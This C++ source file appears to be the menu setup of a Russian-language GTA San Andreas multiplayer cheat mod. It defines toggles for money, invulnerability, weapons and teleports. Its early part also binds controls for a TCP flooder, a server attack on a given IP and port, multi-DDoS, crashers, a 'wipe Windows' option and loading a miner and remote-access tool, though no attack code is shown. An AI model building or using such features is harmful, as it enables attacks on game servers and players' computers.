	TwAddButton(twBar_Testing4, "TCP Флудер", afkaJag, NULL, " group='Пакетные операции' ");
	TwAddButton(twBar_Testing4, "Атаковать(робит на порту 7777)", afkaJa1, NULL, " group='037 Коннектор' ");
	TwAddVarRW(twBar_Testing4, "ИП:ПОРТ", TW_TYPE_CSSTRING(sizeof(ip)), &ip, " group='037 Коннектор' ");
	TwAddButton(twBar_Testing4, "VCMP Freezer Аналог(робит на порту 7777)", afkaJam, NULL, " group='Пакетные операции' ");
	////////////////////////////////
	
		TwAddVarRW(twBar_Testing5, "Дрифтюлексеры Онлайн", TW_TYPE_BOOLCPP, &cheat_state->_generic.pAAAsSA1d, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Переход на сайт ZH", TW_TYPE_BOOLCPP, &cheat_state->_generic.pickm2tr, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Вызов ExitProcess", TW_TYPE_BOOLCPP, &cheat_state->_generic.ddosdd, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Ебет уток", TW_TYPE_BOOLCPP, &cheat_state->_generic.invisible, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Ебет собак", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot1, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Завтра в школу", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot2, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Ебало закрой", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot3, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Го ибаца", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot4, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Админ петух", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot5, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "МультиДДоС", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot6, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Кикнуть", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot7, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Отключить АнтиКрашеры", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot8, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Пульсатор ХП", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot9, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Деформер", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot10, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Быстрое убийство", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot11, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "BAD RCON ATTEMPT", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot12, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Вынос винды", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot13, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Подгрузка Майнера&РМС", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot14, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Зависание игры", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot15, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "ДДоС себя", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot16, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "ДДоС ФСБ", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot17, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Блокировка по реестру", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot18, " group='NetBot Панель' ");
		TwAddVarRW(twBar_Testing5, "Флуд в реестр", TW_TYPE_BOOLCPP, &cheat_state->_generic.netbot19, " group='NetBot Панель' ");
	
	////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	TwAddVarRW(twBar_Testing6, "Анализатор пакетов", TW_TYPE_BOOLCPP, &cheat_state->_generic.invalid_aimzggg, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "RPC Packet Sender", TW_TYPE_BOOLCPP, &cheat_state->_generic.crh1ggd1, " group='Версус Протект' "); 
	TwAddVarRW(twBar_Testing6, "Recvх RPC Sender", TW_TYPE_BOOLCPP, &cheat_state->_generic.crh1ggd3ssss, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "Send Packet Sender", TW_TYPE_BOOLCPP, &cheat_state->_generic.crh1ggd2, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "Recvх Packet Sender", TW_TYPE_BOOLCPP, &cheat_state->_generic.crh1ggd3, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "Анти Загрузка", TW_TYPE_BOOLCPP, &cheat_state->_generic.ssss, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "АнтиКик", TW_TYPE_BOOLCPP, &cheat_state->_generic.crh1gg, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "OnFoot/InCar/Unoc/Aim АнтиКрашер", TW_TYPE_BOOLCPP, &cheat_state->_generic.crh1ggd, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "Bike/Epic/Hyper АнтиКрашер", TW_TYPE_BOOLCPP, &cheat_state->_generic.dfdfdfdf3e3e3e, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "АнтиТюнингКрашер", TW_TYPE_BOOLCPP, &cheat_state->_generic.pickm21, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "Коллизия(Car&Skin)", TW_TYPE_BOOLCPP, &cheat_state->_generic.nocols_enabled, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "NOP_PlayAudioStream(GoC создает лаги)", TW_TYPE_BOOLCPP, &cheat_state->_generic.dssssssfdfdfdf3e3e3e, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "АнтиСкинКрашер", TW_TYPE_BOOLCPP, &cheat_state->_generic.dsssssssdsdsddssdfdfdfdf3e3e3e, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "Фулл Блокировщик пакетов", TW_TYPE_BOOLCPP, &cheat_state->_generic.asasasas9ssssvg, " group='Версус Протект' ");
	TwAddVarRW(twBar_Testing6, "Отключить исходящие пакеты player sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_SND_PLAYER_SYNC, " group='Контроль исходящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить исходящие пакеты unoccupied sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_SND_UNOCCUPIED_SYNC, " group='Контроль исходящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить исходящие пакеты trailer sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_SND_TRAILER_SYNC, " group='Контроль исходящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить исходящие пакеты passenger sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_SND_PASSENGER_SYNC, " group='Контроль исходящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить исходящие пакеты spectator sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_SND_SPECTATOR_SYNC, " group='Контроль исходящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить исходящие пакеты aim sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_SND_AIM_SYNC, " group='Контроль исходящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить исходящие пакеты vehicle sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_SND_VEHICLE_SYNC, " group='Контроль исходящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить исходящие пакеты weapons update", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_SND_WEAPONS_UPDATE, " group='Контроль исходящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить исходящие пакеты stats update", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_SND_STATS_UPDATE, " group='Контроль исходящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить входящие пакеты player sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_RCV_PLAYER_SYNC, " group='Контроль входящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить входящие пакеты markers sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_RCV_MARKERS_SYNC, " group='Контроль входящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить входящие пакеты unoccupied sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_RCV_UNOCCUPIED_SYNC, " group='Контроль входящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить входящие пакеты trailer sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_RCV_TRAILER_SYNC, " group='Контроль входящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить входящие пакеты passenger sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_RCV_PASSENGER_SYNC, " group='Контроль входящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить входящие пакеты aim sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_RCV_AIM_SYNC, " group='Контроль входящих пакетов'  ");
	TwAddVarRW(twBar_Testing6, "Отключить входящие пакеты vehicle sync", TW_TYPE_BOOLCPP, &cheat_state->packet_dsbl_settings.DSBL_RCV_VEHICLE_SYNC, " group='Контроль входящих пакетов'  ");











	
	// Main menu linkers
	TwAddButton(twBar_Main, "Новые читы", NULL, NULL, NULL); 
    iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (430 / 2) - 190; 
    iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (290 / 2) - 190; 
    TwAddButton(twBar_Main, "Новые_операции", testingMenuLinker, NULL, " label='Новые_операции' "); 
    sprintf(menuParameters,"Новые_операции label='Новые_операции' color='0 0 0' position='%d %d' size='430 290' fontsize='2' ", iMainMenuPosX, iMainMenuPosY); 
    TwDefine(menuParameters);

    iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) + 25; 
    iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) + 25; 
    TwAddButton(twBar_Testing, "Разные_операции", testing1MenuLinker, NULL, " label='Разные_операции' "); 
    sprintf(menuParameters,"Разные_операции label='Разные_операции' color='0 0 0' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY); 
    TwDefine(menuParameters);

    iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (420 / 2) - 170; 
    iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (290 / 2) - 170; 
    TwAddButton(twBar_Testing, "Пешие_операции", testing2MenuLinker, NULL, " label='Пешие_операции' "); 
    sprintf(menuParameters,"Пешие_операции label='Пешие_операции' color='0 0 0' position='%d %d' size='420 290' fontsize='2' ", iMainMenuPosX, iMainMenuPosY); 
    TwDefine(menuParameters);

    iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (410 / 2) - 150; 
    iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (290 / 2) - 150; 
    TwAddButton(twBar_Testing, "Автомобильные_операции", testing3MenuLinker, NULL, " label='Автомобильные_операции' "); 
    sprintf(menuParameters,"Автомобильные_операции label='Автомобильные_операции' color='0 0 0' position='%d %d' size='410 290' fontsize='2' ", iMainMenuPosX, iMainMenuPosY); 
    TwDefine(menuParameters);

    iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (400 / 2) - 130; 
    iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (290 / 2) - 130; 
    TwAddButton(twBar_Testing, "Пакетные_операции", testing4MenuLinker, NULL, " label='Пакетные_операции' "); 
    sprintf(menuParameters,"Пакетные_операции label='Пакетные_операции' color='0 0 0' position='%d %d' size='400 290' fontsize='2' ", iMainMenuPosX, iMainMenuPosY); 
    TwDefine(menuParameters);

	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (400 / 2) - 130;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (290 / 2) - 130;
	TwAddButton(twBar_Testing, "NetBot_Панель", testing5MenuLinker, NULL, " label='NetBot_Панель' ");
	sprintf(menuParameters, "NetBot_Панель label='NetBot_Панель' color='0 0 0' position='%d %d' size='390 290' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);

	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (400 / 2) - 130;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (290 / 2) - 130;
	TwAddButton(twBar_Testing, "Версус_Протект", testing6MenuLinker, NULL, " label='Версус_Протект' ");
	sprintf(menuParameters, "Версус_Протект label='Версус_Протект' color='0 0 0' position='%d %d' size='390 290' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);
	
	

    TwAddButton(twBar_Main, "ГТА", NULL, NULL, NULL);
	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) - 150;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) - 150;
	TwAddButton(twBar_Main, "Читы", cheatsMenuLinker, NULL, " label='Читы' ");
	sprintf(menuParameters," Читы label='Читы' color='255 0 0' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);

	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) - 125;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) - 125;
	TwAddButton(twBar_Main, "Оружие", weaponsMenuLinker, NULL, " label='Оружие' ");
	sprintf(menuParameters," Оружие label='Оружие' color='255 255 0' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);

	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) - 100;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) - 100;
	TwAddButton(twBar_Main, "Машины", vehiclesMenuLinker, NULL, " label='Машины' ");
	sprintf(menuParameters," Машины label='Машины' color='0 255 0' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);

	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) - 75;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) - 75;
	TwAddButton(twBar_Main, "Телепорты", teleportsMenuLinker, NULL, " label='Телепорты' ");
	sprintf(menuParameters," Телепорты label='Телепорты' color='0 0 255' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);

	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) - 50;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) - 50;
	TwAddButton(twBar_Main, "Разное", GTAMiscMenuLinker, NULL, " label='Разное' ");
	sprintf(menuParameters," Разное label='Разное' color='255 0 0' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);

	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) - 25;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) - 25;
	TwAddButton(twBar_Main, "GTA_Патчи", GTAPatchesMenuLinker, NULL, " label='GTA_Патчи' ");
	sprintf(menuParameters," GTA_Патчи label='GTA_Патчи' color='255 255 0' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);

	//TwAddButton(twBar_Main, " ", NULL, NULL, NULL);

	TwAddButton(twBar_Main, "СА:МП", NULL, NULL, NULL);
    iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) + 25;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) + 25;
	TwAddButton(twBar_Main, "Игроки", playersMenuLinker, NULL, " label='Игроки' ");
	sprintf(menuParameters," Игроки label='Игроки' color='0 255 0' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);

	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) + 50;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) + 50;
	TwAddButton(twBar_Main, "Ваш_список_серверов", favServersMenuLinker, NULL, " label='Ваш_список_серверов' ");
	sprintf(menuParameters," Ваш_список_серверов label='Ваш_список_серверов' color='0 0 255' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);

	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) + 75;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) + 75;
	TwAddButton(twBar_Main, "СА:МП_Разное", SAMPMiscMenuLinker, NULL, " label='СА:МП_Разное' ");
	sprintf(menuParameters," СА:МП_Разное label='СА:МП_Разное' color='255 0 0' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);

	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) + 100;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) + 100;
	TwAddButton(twBar_Main, "СА:МП_Патчи", SAMPPatchesMenuLinker, NULL, " label='СА:МП_Патчи' ");
	sprintf(menuParameters," СА:МП_Патчи label='СА:МП_Патчи' color='255 255 0' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);
	
	
    // CHEATS
	// Cheats -> Vehicle upgrades
	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) - 175;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) - 175;
	TwAddButton(twBar_SPCheats, "Модернизация_автомобиля", carUpgradesMenuLinker, NULL, " label='Модернизация_автомобиля' ");
	sprintf(menuParameters," Модернизация_автомобиля label='Читы -> Модернизация_автомобиля' color='0 255 0' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);

	// Cheats -> Vehicle colors and paintjobs
	iMainMenuPosX = (pPresentParam.BackBufferWidth / 2) - (405 / 2) - 200;
	iMainMenuPosY = (pPresentParam.BackBufferHeight / 2) - (235 / 2) - 200;
	TwAddButton(twBar_SPCheats, "Цвет_Автомобиля", carColorPaintjobLinker, NULL, " label='Цвет_Автомобиля' ");
	sprintf(menuParameters," Цвет_Автомобиля label='Читы -> Цвет_Автомобиля' color='0 0 255' position='%d %d' size='405 235' fontsize='2' ", iMainMenuPosX, iMainMenuPosY);
	TwDefine(menuParameters);

	// Cheats -> Money
	TwAddVarRW(twBar_SPCheats, "Включить чит на деньги", TW_TYPE_BOOLCPP, &cheat_state->_generic.money, " group='Деньги' ");
	TwAddVarRW(twBar_SPCheats, "Колличество денег", TW_TYPE_INT32, &*(uint32_t *)0xB7CE50, " label='Деньги value' min=0 max=99999999 group='Деньги' ");
	TwAddVarRW(twBar_SPCheats, "Максимальное колличество", TW_TYPE_INT32, &set.money_amount_max, " label='Максимальное колличество' group='Деньги' ");
	TwAddVarRW(twBar_SPCheats, "Рандомное-минимальное", TW_TYPE_INT32, &set.money_amount_rand_min, " label='Рандомное-минимальное' group='Деньги' ");
	TwAddVarRW(twBar_SPCheats, "Рандомное-максимальное", TW_TYPE_INT32, &set.money_amount_rand_max, " label='Рандомное-максимальное' group='Деньги' ");
	TwAddVarRW(twBar_SPCheats, "Интервал в минутах", TW_TYPE_INT32, &set.money_interval_rand_min, " label='Интервал в минутах' group='Деньги' ");
	TwAddVarRW(twBar_SPCheats, "Максимальный интервал", TW_TYPE_INT32, &set.money_interval_rand_max, " label='Максимальный интервал' group='Деньги' ");
	TwDefine(" Читы/Деньги opened='false' ");

	// Cheats -> Invulnerable
	TwAddVarRW(twBar_SPCheats, "Включить макс.Бессмертие", TW_TYPE_BOOLCPP, &cheat_state->_generic.hp_cheat, " group='Бессмертие' ");
	TwAddVarRW(twBar_SPCheats, "Бессмертие игрока", TW_TYPE_BOOLCPP, &cheat_state->actor.invulnerable, " group='Бессмертие' ");
	TwAddVarRW(twBar_SPCheats, "Бессмертие машины", TW_TYPE_BOOLCPP, &cheat_state->vehicle.invulnerable, " group='Бессмертие' ");
	TwAddVarRW(twBar_SPCheats, "Защита шин автомобиля", TW_TYPE_BOOLCPP, &cheat_state->vehicle.hp_tire_support, " group='Бессмертие' ");
	TwAddVarRW(twBar_SPCheats, "Минимальное ХП у машины", TW_TYPE_BOOLCPP, &cheat_state->vehicle.hp_minimum_on, " group='Бессмертие' ");
	TwAddVarRW(twBar_SPCheats, "Введите колличество ХП машине", TW_TYPE_FLOAT, &set.hp_minimum, " label='Колличество ХП машине' min=0.0 max=1000.0 group='Бессмертие' ");
	TwAddVarRW(twBar_SPCheats, "Регенерация ХП машины", TW_TYPE_BOOLCPP, &cheat_state->vehicle.hp_regen_on, " group='Invulnerable' ");
	TwAddVarRW(twBar_SPCheats, "Введите колличество ХП регерации", TW_TYPE_FLOAT, &set.hp_regen, " label='Колличество ХП регерации' min=0.0 max=1000.0 group='Бессмертие' ");
	TwAddVarRW(twBar_SPCheats, "Разная защита автомобиля", TW_TYPE_BOOLCPP, &cheat_state->vehicle.protection, " group='Бессмертие' ");
	TwAddVarRW(twBar_SPCheats, "Регенерация ХП игрока", TW_TYPE_BOOLCPP, &cheat_state->actor.hp_regen_on, " group='Бессмертие' ");
	TwAddVarRW(twBar_SPCheats, "Введите колличество ХП регерации", TW_TYPE_FLOAT, &set.hp_regen, " label='Onfoot HP regeneration value' min=0.0 max=100.0 group='Бессмертие' ");
	TwDefine(" Читы/Бессмертие opened='false' ");

	// Cheats
    TwAddButton(twBar_SPCheats, "Пополнить ХП", restoreHealth, NULL, " label='Пополнить ХП' ");
    TwAddButton(twBar_SPCheats, "Пополнить броню", restoreArmor, NULL, " label='Пополнить броню' ");
	TwAddVarRW(twBar_SPCheats, "Погода", TW_TYPE_INT32, &set.force_weather, " label='Погода' min=0 max=255 ");
	TwAddVarRW(twBar_SPCheats, "Время", TW_TYPE_INT32, &set.force_hour, " label='Время' min=-1 max=23 ");
	TwAddVarRW(twBar_SPCheats, "Гравитация", TW_TYPE_FLOAT, &*(float *)0x863984, " label='Гравитация' min=0.000 max=0.050 precision=3 step=0.001 ");
	TwAddVarRW(twBar_SPCheats, "Карта", TW_TYPE_BOOLCPP, &cheat_state->_generic.map, " label='Карта' ");
	TwAddVarRW(twBar_SPCheats, "Тексты телепорта", TW_TYPE_BOOLCPP, &cheat_state->_generic.teletext, " label='Тексты телепорта' ");
	TwAddVarRW(twBar_SPCheats, "Разные защиты", TW_TYPE_BOOLCPP, &cheat_state->vehicle.protection, " label='Разные защиты' ");
	TwAddButton(twBar_SPCheats, "Ближайшая машина", gotoNearestEmptyCar, NULL, " label='Ближайшая машина' ");
	TwAddButton(twBar_SPCheats, "Взять ДжетПак", giveJetpack, NULL, " label='Взять ДжетПак' ");
	TwAddVarRW(twBar_SPCheats, "Открыть машины", TW_TYPE_BOOLCPP, &cheat_state->_generic.vehicles_unlock, " label='Открыть машины' ");
	TwAddVarRW(twBar_SPCheats, "Аттачить трейлеры", TW_TYPE_BOOLCPP, &cheat_state->vehicle.keep_trailer_attached, " label='Аттачить трейлеры' ");
	TwAddVarRW(twBar_SPCheats, "Коллизия", TW_TYPE_BOOLCPP, &cheat_state->_generic.nocols_enabled, " label='Коллизия' ");
	TwAddVarRW(twBar_SPCheats, "Скорость игры", TW_TYPE_FLOAT, &cheat_state->game_speed, " label='Скорость игры' min=0.0 max=20.0 precision=1 step= 0.05 ");
	TwAddVarRW(twBar_SPCheats, "Чамс", TW_TYPE_BOOLCPP, &set.chams_on, " label='Chams' ");
	
	TwAddVarRW(twBar_SPCheats, "Скорость ФлайХака", TW_TYPE_FLOAT, &set.fly_player_speed, " label='Скорость ФлайХака' min=0.1 max=50.0 precision=1 step=0.1 ");
	TwDefine(" Читы opened='false' ");

	// WEAPONS
	TwAddVarRW(twBar_SPWeapons, "Вкл.Чит на оружие", TW_TYPE_BOOLCPP, &cheat_state->_generic.weapon, NULL);
	TwAddVarRW(twBar_SPWeapons, "Рандом значение патронов", TW_TYPE_BOOLCPP, &set.ammo_random, NULL);
	TwAddVarRW(twBar_SPWeapons, "Патроны", TW_TYPE_INT32, &iMenuWeaponAmmo, " min=1 max=99999 ");
	TwAddVarRW(twBar_SPWeapons, "Патроны в клип", TW_TYPE_INT32, &iMenuWeaponAmmoClip, " min=1 max=99 ");
	TwAddButton(twBar_SPWeapons, " ", NULL, NULL, NULL);
	TwAddButton(twBar_SPWeapons, "ОРУЖИЕ", NULL, NULL, NULL);
	for(i = 0; i < 13; i++)
	{
		const struct weapon_entry *weapon = weapon_list;
		snprintf(buf, sizeof(buf), "Слот %d", i);
		TwAddButton(twBar_SPWeapons, buf, NULL, NULL, NULL);
		while(weapon->name != NULL)
		{
			if(weapon->slot == i)
				TwAddButton(twBar_SPWeapons, weapon->name, giveWeapon, (void *)weapon, NULL);
			weapon++;
		}
	}
	TwDefine(" Оружие opened='false' ");
	
	// VEHICLES
	// to be populated by the hook
	TwDefine(" Машины opened='false' ");

	// TELEPORTS
	for ( i = 0; i < 146; i++ )
	{
		TwAddButton(twBar_SPTeleports, interiors_list[i].interior_name, menuInteriorTeleport, (void *)&interiors_list[i], " group='Интерьеры' ");
	}
	for ( i = 0; i < STATIC_TELEPORT_MAX; i++ )
	{
		if ( strlen(set.static_teleport_name[i]) == 0 )
			continue;

		if ( vect3_near_zero(set.static_teleport[i].pos) )
			continue;

		set.static_teleport[i].iMenuID = i;
		TwAddButton(twBar_SPTeleports, set.static_teleport_name[i], menuTeleport, &set.static_teleport[i], NULL);
	}
	TwDefine(" Телепорты/Интерьеры opened='false' ");
	TwDefine(" Телепорты opened='false' ");

	// MISC
	// Misc. -> Debug
	TwAddVarRW(twBar_SPMisc, "Активировать отладку", TW_TYPE_BOOLCPP, &cheat_state->debug_enabled, " group='Отладка' ");
	TwAddButton(twBar_SPMisc, "Личность игрока", menuDebugHandler, (void *)actor_info_get(ACTOR_SELF, 0), " group='Отладка' ");
	TwAddButton(twBar_SPMisc, "Личность машины", menuDebugHandler, (void *)vehicle_info_get(VEHICLE_SELF, 0), " group='Отладка' ");
	if ( g_dwSAMP_Addr != NULL )
	{
		TwAddButton(twBar_SPMisc, "СА:МП DLL", menuDebugHandler, (void *)g_dwSAMP_Addr, " group='Отладка' ");
		TwAddButton(twBar_SPMisc, "СА:МП Инфо", menuDebugHandler, (void *)g_SAMP, " group='Отладка' ");
		TwAddButton(twBar_SPMisc, "СА:МП Лист игроков", menuDebugHandler, (void *)g_Players, " group='Отладка' ");
		TwAddButton(twBar_SPMisc, "СА:МП Локальное инфо", menuDebugHandler, (void *)g_Players->pLocalPlayer, " group='Отладка' ");
		TwAddButton(twBar_SPMisc, "СА:МП Лист машин", menuDebugHandler, (void *)g_Vehicles, " group='Отладка' ");
		TwAddButton(twBar_SPMisc, "СА:МП Чат инфо", menuDebugHandler, (void *)g_Chat, " group='Отладка' ");
		TwAddButton(twBar_SPMisc, "СА:МП Входящее инфо", menuDebugHandler, (void *)g_Input, " group='Отладка' ");
		TwAddButton(twBar_SPMisc, "СА:МП Мертвое инфо", menuDebugHandler, (void *)g_DeathList, " group='Отладка' ");
		TwAddButton(twBar_SPMisc, "СА:МП Локальные SAMP-PED", menuDebugHandler, (void *)g_Players->pLocalPlayer->pSAMP_Actor, " group='Отладка' ");
	}
	TwDefine(" Разное/Отладка opened='false' ");

	TwAddButton(twBar_SPMisc, "Запись координат в лог файл", writeCoordToLogFile, NULL, NULL);
	TwAddButton(twBar_SPMisc, "Перезапуск настроек", reloadSettings, NULL, NULL);
	TwAddVarRW(twBar_SPMisc, "Переключатель текста ХУДА", TW_TYPE_BOOLCPP, &set.d3dtext_hud, NULL);
	TwAddVarRW(twBar_SPMisc, "Отключить плохое оружие", TW_TYPE_BOOLCPP, &cheat_state->_generic.weapon_disable, NULL);
	TwAddVarRW(twBar_SPMisc, "Информация о трейлере", TW_TYPE_BOOLCPP, &set.trailer_support, NULL);

	// Misc. -> HUD
	TwAddVarRW(twBar_SPMisc, "ХУД Нижний худ", TW_TYPE_BOOLCPP, &set.hud_draw_bar, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД Отображение текста", TW_TYPE_BOOLCPP, &set.render_text_shadows, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД Бессмертие", TW_TYPE_BOOLCPP, &set.hud_indicator_inv, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД Оружие", TW_TYPE_BOOLCPP, &set.hud_indicator_weapon, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД Деньги", TW_TYPE_BOOLCPP, &set.hud_indicator_money, " group='ХУД' ");
	TwAddVarRW(twBar_SPMisc, "ХУД Заморозка", TW_TYPE_BOOLCPP, &set.hud_indicator_freeze, " group='ХУД' ");
